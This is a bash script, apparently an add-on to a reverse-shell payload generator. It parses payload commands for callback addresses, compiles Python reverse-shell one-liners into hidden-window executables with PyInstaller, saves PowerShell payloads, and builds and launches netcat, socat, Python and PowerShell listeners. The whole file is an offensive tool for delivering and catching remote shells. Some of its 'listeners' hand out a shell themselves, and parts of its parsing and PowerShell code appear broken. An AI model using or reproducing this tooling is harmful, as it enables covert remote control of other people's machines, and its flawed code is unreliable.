#!/usr/bin/env bash
# post_revgen.sh – Ultimate post‑processor for REVSHELL FACTORY payloads
# Usage: ./post_revgen.sh [payloads.txt] [--compile] [--listener-only]

set -e

# ----------------------------------------------------------------------
# Colors
# ----------------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
MAGENTA='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

print_success() { echo -e "${GREEN}[+]${NC} $1"; }
print_error() { echo -e "${RED}[-]${NC} $1"; }
print_info() { echo -e "${BLUE}[*]${NC} $1"; }
print_warning() { echo -e "${YELLOW}[!]${NC} $1"; }
print_highlight() { echo -e "${CYAN}[~]${NC} $1"; }

# ----------------------------------------------------------------------
# Parse arguments
# ----------------------------------------------------------------------
PAYLOAD_FILE=""
COMPILE_ALWAYS=0
LISTENER_ONLY=0

while [[ $# -gt 0 ]]; do
    case $1 in
        --compile) COMPILE_ALWAYS=1; shift ;;
        --listener-only) LISTENER_ONLY=1; shift ;;
        *) PAYLOAD_FILE="$1"; shift ;;
    esac
done

# ----------------------------------------------------------------------
# Helper: detect listener type from payload command
# ----------------------------------------------------------------------
detect_listener_type() {
    local cmd="$1"
    if [[ "$cmd" =~ ^(nc|ncat|netcat) ]]; then
        echo "netcat"
    elif [[ "$cmd" =~ ^socat ]]; then
        echo "socat"
    elif [[ "$cmd" =~ ^python ]]; then
        echo "python"
    elif [[ "$cmd" =~ ^powershell ]]; then
        echo "powershell"
    elif [[ "$cmd" =~ "ncat" ]]; then
        echo "ncat"
    else
        echo "netcat"
    fi
}

# ----------------------------------------------------------------------
# Generate listener command based on type and port
# ----------------------------------------------------------------------
generate_listener_cmd() {
    local ltype="$1"
    local port="$2"
    case "$ltype" in
        netcat) echo "nc -lvnp $port" ;;
        socat)  echo "socat TCP-LISTEN:$port,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane" ;;
        ncat)   echo "ncat -lvnp $port --ssl" ;;
        python) echo "python3 -c 'import socket,subprocess;s=socket.socket();s.bind((\"0.0.0.0\",$port));s.listen(1);c,a=s.accept();subprocess.run([\"/bin/sh\"],stdin=c.makefile(\"r\"),stdout=c.makefile(\"w\"))'" ;;
        powershell) echo "powershell -NoP -NonI -Exec Bypass -Command \"\$listener = New-Object System.Net.Sockets.TcpListener('0.0.0.0',$port);\$listener.Start();\$client = \$listener.AcceptTcpClient();\$stream = \$client.GetStream();\$writer = New-Object System.IO.StreamWriter(\$stream);\$reader = New-Object System.IO.StreamReader(\$stream);while(\$true){ \$cmd = Read-Host; \$writer.WriteLine(\$cmd); \$writer.Flush(); \$output = \$reader.ReadToEnd(); Write-Host \$output }\""
            ;;
        *) echo "nc -lvnp $port" ;;
    esac
}

# ----------------------------------------------------------------------
# Copy to clipboard (cross‑platform)
# ----------------------------------------------------------------------
copy_to_clipboard() {
    local text="$1"
    if command -v pbcopy &>/dev/null; then
        echo "$text" | pbcopy
        print_success "Copied to clipboard (pbcopy)"
    elif command -v xclip &>/dev/null; then
        echo "$text" | xclip -selection clipboard
        print_success "Copied to clipboard (xclip)"
    elif command -v clip.exe &>/dev/null; then
        echo "$text" | clip.exe
        print_success "Copied to clipboard (clip.exe)"
    else
        print_warning "Clipboard tool not found. Install pbcopy, xclip, or use Windows clip.exe"
    fi
}

# ----------------------------------------------------------------------
# Start listener in a new terminal
# ----------------------------------------------------------------------
start_listener_terminal() {
    local cmd="$1"
    local port="$2"
    print_info "Starting listener on port $port..."
    case "$OSTYPE" in
        darwin*)
            osascript -e "tell application \"Terminal\" to do script \"$cmd\""
            ;;
        linux*)
            if command -v xterm &>/dev/null; then
                xterm -e "$cmd" &
            elif command -v gnome-terminal &>/dev/null; then
                gnome-terminal -- bash -c "$cmd; exec bash" &
            else
                print_warning "No terminal emulator found. Run manually: $cmd"
            fi
            ;;
        msys*|cygwin*|win32*)
            start cmd /k "$cmd" 2>/dev/null || print_warning "Run manually: $cmd"
            ;;
        *)
            print_warning "Unsupported OS. Run manually: $cmd"
            ;;
    esac
}

# ----------------------------------------------------------------------
# 1. Get payload input
# ----------------------------------------------------------------------
PAYLOAD_RAW=""
if [[ -n "$PAYLOAD_FILE" && -f "$PAYLOAD_FILE" ]]; then
    print_info "Using payload file: $PAYLOAD_FILE"
    # Show preview (first 10 lines, stripping number prefixes if any)
    echo "--- Available payloads (first 10 lines) ---"
    if [[ "$PAYLOAD_FILE" == *.json ]]; then
        cat "$PAYLOAD_FILE" | jq -r '.[] | .command' | nl -w2 -s': ' | head -10
    elif [[ "$PAYLOAD_FILE" == *.md ]]; then
        grep -E '^```bash$' -A1 "$PAYLOAD_FILE" | grep -v '```' | nl -w2 -s': ' | head -10
    else
        nl -w2 -s': ' "$PAYLOAD_FILE" | head -10
    fi
    echo "-------------------------------------------"
    read -p "Enter line number(s) (e.g., 1,2-3, or 'a' for all, 'm' for manual): " CHOICE
else
    if [[ $LISTENER_ONLY -eq 0 ]]; then
        print_info "No file provided. Paste your payload command below (end with Ctrl+D):"
        PAYLOAD_RAW=$(cat)
        CHOICE="m"
    else
        CHOICE="listener"
    fi
fi

# ----------------------------------------------------------------------
# 2. Extract payload command(s)
# ----------------------------------------------------------------------
declare -a PAYLOAD_CMDS
if [[ "$CHOICE" == "listener" ]]; then
    # Do nothing
    :
elif [[ "$CHOICE" =~ ^[aA]$ ]]; then
    # All payloads
    if [[ "$PAYLOAD_FILE" == *.json ]]; then
        mapfile -t PAYLOAD_CMDS < <(jq -r '.[] | .command' "$PAYLOAD_FILE")
    elif [[ "$PAYLOAD_FILE" == *.md ]]; then
        mapfile -t PAYLOAD_CMDS < <(grep -E '^```bash$' -A1 "$PAYLOAD_FILE" | grep -v '```')
    else
        mapfile -t PAYLOAD_CMDS < <(sed 's/^[0-9]*: //' "$PAYLOAD_FILE")
    fi
elif [[ "$CHOICE" =~ ^[mM]$ ]]; then
    if [[ -z "$PAYLOAD_RAW" ]]; then
        read -p "Paste payload command: " PAYLOAD_RAW
    fi
    PAYLOAD_CMDS=("$PAYLOAD_RAW")
else
    # Parse ranges like "1,3-5,2"
    IFS=',' read -ra RANGES <<< "$CHOICE"
    for range in "${RANGES[@]}"; do
        if [[ "$range" =~ ^([0-9]+)$ ]]; then
            line_num="${BASH_REMATCH[1]}"
            if [[ "$PAYLOAD_FILE" == *.json ]]; then
                cmd=$(jq -r ".[$((line_num-1))].command" "$PAYLOAD_FILE" 2>/dev/null)
            elif [[ "$PAYLOAD_FILE" == *.md ]]; then
                cmd=$(grep -E '^```bash$' -A1 "$PAYLOAD_FILE" | grep -v '```' | sed -n "${line_num}p")
            else
                cmd=$(sed -n "${line_num}p" "$PAYLOAD_FILE" | sed 's/^[0-9]*: //')
            fi
            [[ -n "$cmd" ]] && PAYLOAD_CMDS+=("$cmd")
        elif [[ "$range" =~ ^([0-9]+)-([0-9]+)$ ]]; then
            for ((n=${BASH_REMATCH[1]}; n<=${BASH_REMATCH[2]}; n++)); do
                if [[ "$PAYLOAD_FILE" == *.json ]]; then
                    cmd=$(jq -r ".[$((n-1))].command" "$PAYLOAD_FILE" 2>/dev/null)
                elif [[ "$PAYLOAD_FILE" == *.md ]]; then
                    cmd=$(grep -E '^```bash$' -A1 "$PAYLOAD_FILE" | grep -v '```' | sed -n "${n}p")
                else
                    cmd=$(sed -n "${n}p" "$PAYLOAD_FILE" | sed 's/^[0-9]*: //')
                fi
                [[ -n "$cmd" ]] && PAYLOAD_CMDS+=("$cmd")
            done
        fi
    done
fi

if [[ ${#PAYLOAD_CMDS[@]} -eq 0 ]] && [[ "$CHOICE" != "listener" ]]; then
    print_error "No valid payload commands selected."
    exit 1
fi

# ----------------------------------------------------------------------
# 3. Process each payload (if multiple, iterate)
# ----------------------------------------------------------------------
for PAYLOAD_CMD in "${PAYLOAD_CMDS[@]}"; do
    echo ""
    print_highlight "Processing payload:"
    echo "$PAYLOAD_CMD"

    # ------------------------------------------------------------------
    # 3.1 Extract IP and port
    # ------------------------------------------------------------------
    TARGET_IP=""
    TARGET_PORT=""
    
    # IPv4
    if [[ "$PAYLOAD_CMD" =~ ([0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}) ]]; then
        TARGET_IP="${BASH_REMATCH[1]}"
    # IPv6 with brackets
    elif [[ "$PAYLOAD_CMD" =~ \[([a-fA-F0-9:]+)\] ]]; then
        TARGET_IP="${BASH_REMATCH[1]}"
    # Plain IPv6
    elif [[ "$PAYLOAD_CMD" =~ ([a-fA-F0-9:]+) ]]; then
        TARGET_IP="${BASH_REMATCH[1]}"
    fi

    # Port (look for 1-5 digits after a colon or comma or whitespace)
    if [[ "$PAYLOAD_CMD" =~ [^0-9]([0-9]{1,5})[^0-9] ]]; then
        TARGET_PORT="${BASH_REMATCH[1]}"
    fi

    if [[ -z "$TARGET_IP" || -z "$TARGET_PORT" ]]; then
        print_warning "Could not auto-detect IP/port"
        read -p "Enter listener IP: " TARGET_IP
        read -p "Enter listener port: " TARGET_PORT
    else
        print_info "Detected IP: $TARGET_IP  Port: $TARGET_PORT"
        read -p "Is this correct? (Y/n): " CONFIRM
        if [[ "$CONFIRM" =~ ^[Nn] ]]; then
            read -p "Enter listener IP: " TARGET_IP
            read -p "Enter listener port: " TARGET_PORT
        fi
    fi

    # ------------------------------------------------------------------
    # 3.2 Handle Python payloads (extract and compile)
    # ------------------------------------------------------------------
    if [[ "$PAYLOAD_CMD" =~ ^python3?\ -c\ \'([^\']*)\' ]]; then
        PY_CODE="${BASH_REMATCH[1]}"
        print_info "Detected Python one-liner payload"
        SHOULD_COMPILE=$COMPILE_ALWAYS
        if [[ $COMPILE_ALWAYS -eq 0 ]]; then
            read -p "Extract to Python script and compile with PyInstaller? (y/N): " COMPILE_ANS
            [[ "$COMPILE_ANS" =~ ^[Yy]$ ]] && SHOULD_COMPILE=1
        fi
        if [[ $SHOULD_COMPILE -eq 1 ]]; then
            cat > payload.py <<EOF
#!/usr/bin/env python3
$PY_CODE
EOF
            chmod +x payload.py
            print_success "Created payload.py"
            
            if ! command -v pyinstaller &>/dev/null; then
                print_warning "PyInstaller not found. Installing via pip..."
                pip install pyinstaller
            fi
            print_info "Compiling payload.py (this may take a moment)..."
            pyinstaller --onefile --noconsole --name "payload" payload.py > /tmp/pyinstaller.log 2>&1
            if [[ -f "dist/payload" || -f "dist/payload.exe" ]]; then
                print_success "Executable created in ./dist/"
                EXEC_PATH="dist/payload"
                [[ "$OSTYPE" == "msys" || "$OSTYPE" == "win32" ]] && EXEC_PATH="dist/payload.exe"
                print_success "Payload executable: $EXEC_PATH"
            else
                print_error "Compilation failed. Check /tmp/pyinstaller.log"
            fi
        else
            print_info "Skipping compilation. You can run: python3 payload.py"
        fi
    elif [[ "$PAYLOAD_CMD" =~ ^powershell ]]; then
        print_info "Detected PowerShell payload"
        read -p "Save as .ps1 script? (y/N): " SAVE_PS
        if [[ "$SAVE_PS" =~ ^[Yy]$ ]]; then
            echo "$PAYLOAD_CMD" > payload.ps1
            print_success "Saved as payload.ps1"
        fi
    else
        print_info "Non‑Python/powershell payload – compilation skipped."
    fi

    # ------------------------------------------------------------------
    # 3.3 Generate and show listener command
    # ------------------------------------------------------------------
    LISTENER_TYPE=$(detect_listener_type "$PAYLOAD_CMD")
    LISTENER_CMD=$(generate_listener_cmd "$LISTENER_TYPE" "$TARGET_PORT")
    
    echo ""
    print_success "Listener command for this payload:"
    echo -e "${GREEN}$LISTENER_CMD${NC}"
    
    copy_to_clipboard "$LISTENER_CMD"
    
    if [[ $LISTENER_ONLY -eq 0 ]]; then
        read -p "Start listener now? (y/N): " START_NOW
        if [[ "$START_NOW" =~ ^[Yy]$ ]]; then
            start_listener_terminal "$LISTENER_CMD" "$TARGET_PORT"
        fi
    fi

done

# ----------------------------------------------------------------------
# 4. If --listener-only, just ask for port
# ----------------------------------------------------------------------
if [[ $LISTENER_ONLY -eq 1 ]]; then
    read -p "Enter port to listen on: " PORT
    read -p "Listener type (netcat/socat/ncat/python/powershell) [netcat]: " LTYPE
    LTYPE=${LTYPE:-netcat}
    LISTENER_CMD=$(generate_listener_cmd "$LTYPE" "$PORT")
    print_success "Listener command:"
    echo -e "${GREEN}$LISTENER_CMD${NC}"
    copy_to_clipboard "$LISTENER_CMD"
    read -p "Start listener now? (y/N): " START_NOW
    if [[ "$START_NOW" =~ ^[Yy]$ ]]; then
        start_listener_terminal "$LISTENER_CMD" "$PORT"
    fi
fi

print_success "All done."
